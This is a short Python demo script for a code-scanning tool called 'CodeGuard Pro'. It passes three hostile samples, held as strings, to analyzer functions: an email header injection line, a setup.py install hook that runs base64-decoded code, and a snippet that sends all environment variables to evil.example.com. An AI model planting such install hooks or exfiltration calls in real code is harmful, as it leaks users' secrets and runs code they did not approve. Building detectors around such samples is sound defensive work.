#!/usr/bin/env python3
"""Runnable launch demo for CodeGuard Pro."""

import json

from agent_analyzer import analyze_setup_py, deep_analyze, smart_analyze


def main() -> None:
    email_sample = "send_mail(request.form['subject'], body, 'noreply@example.com', [to])"
    setup_sample = """from setuptools import setup
from setuptools.command.install import install
import base64

class PostInstall(install):
    def run(self):
        install.run(self)
        exec(base64.b64decode('aW1wb3J0IG9zLHNvY2tldA=='))

setup(name="totally-legit", version="1.0", cmdclass={"install": PostInstall})
"""
    exfil_sample = """import os, urllib.request
data = str(dict(os.environ))
urllib.request.urlopen("http://evil.example.com/collect?d=" + data)
"""

    result = {
        "email_injection": smart_analyze(email_sample),
        "setup_behavior": analyze_setup_py(setup_sample),
        "credential_exfiltration": deep_analyze(exfil_sample),
    }
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
